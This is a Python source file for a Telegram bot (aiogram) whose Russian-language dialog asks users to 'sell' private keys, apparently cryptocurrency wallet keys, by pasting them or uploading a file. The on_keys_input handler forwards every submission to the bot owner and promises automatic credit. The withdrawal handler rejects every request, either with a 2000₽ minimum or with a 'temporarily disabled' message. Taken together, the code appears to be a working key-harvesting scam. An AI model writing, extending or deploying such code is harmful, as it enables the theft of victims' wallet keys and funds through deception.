from typing import *

from aiogram import Bot
from aiogram.enums import ContentType
from aiogram.types import CallbackQuery, Message, BufferedInputFile, InlineKeyboardMarkup, \
    InlineKeyboardButton, InputFile
from aiogram_dialog import Window, Dialog, DialogManager
from aiogram_dialog.widgets.input import MessageInput
from aiogram_dialog.widgets.kbd import Button
from aiogram_dialog.widgets.text import Jinja, Const

from src.apps.root import texts
from src.apps.root.states import UserDialog
from src.common import Close
from src.data.config import Config
from src.database import User


# region GETTERS
async def profile_getter(dialog_manager: DialogManager, **_kwargs: Any) -> Dict[str, Any]:
    user = dialog_manager.middleware_data["user"]
    return {
        "user": user
    }


# endregion

# region ON EVENTS FUNCTIONS
async def on_withdraw_click(call: CallbackQuery, _widget: Button, manager: DialogManager):
    user: User = manager.middleware_data["user"]
    min_withdraw = 2000
    if user.balance < min_withdraw:
        await call.answer(f"⚠️ Минимальный вывод от {min_withdraw}₽!", True)
    else:
        await call.answer("⚠️ Вывод средств временно отключен!", True)


async def on_keys_input(msg: Message, _widget: MessageInput, manager: DialogManager):
    if msg.content_type == ContentType.TEXT:
        file = BufferedInputFile(msg.text.encode("utf-8"), "keys.txt")
    elif msg.content_type == ContentType.DOCUMENT:
        file = msg.document.file_id
    else:
        return
    await msg.answer(
        "<b>✅ Ключи отправлены на проверку, как только она закончиться, средства автоматически начилятся на ваш баланс!</b>"
    )
    config: Config = manager.middleware_data["config"]
    bot: Bot = manager.middleware_data["bot"]
    await bot.send_document(
        chat_id=config.global_data.owner_id,
        caption=f"<b>🔔 Пользователь <code>ID{msg.from_user.id}</code> отправил ключи</b>",
        document=file,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="💰 Начислить средства", callback_data=f"add_balance:{msg.from_user.id}")
        ]])
    )
    await manager.done()


async def on_sell_click(call: CallbackQuery, _widget: Button, manager: DialogManager):
    await manager.start(UserDialog.sell)


# endregion

# region DIALOGS
dialog = Dialog(
    Window(
        Jinja(texts.profile),
        Button(Const("🔑 Продать ключи"), id="sell", on_click=on_sell_click),
        Button(Const("💸 Вывод средств"), id="withdraw", on_click=on_withdraw_click),
        Close(texts.close),
        state=UserDialog.profile,
        getter=profile_getter
    ),
    Window(
        Jinja(
            "<b>📥 Отправьте приватные ключи <code>текстом/файлом</code></b>\n\n"
            "<i>🤖 Формат ключей: <code>1 строка = 1 ключ</code></i>"
        ),
        MessageInput(
            on_keys_input,
            content_types=[ContentType.TEXT, ContentType.DOCUMENT],
        ),
        Close(texts.cancel),
        state=UserDialog.sell,
    )
)
# endregion
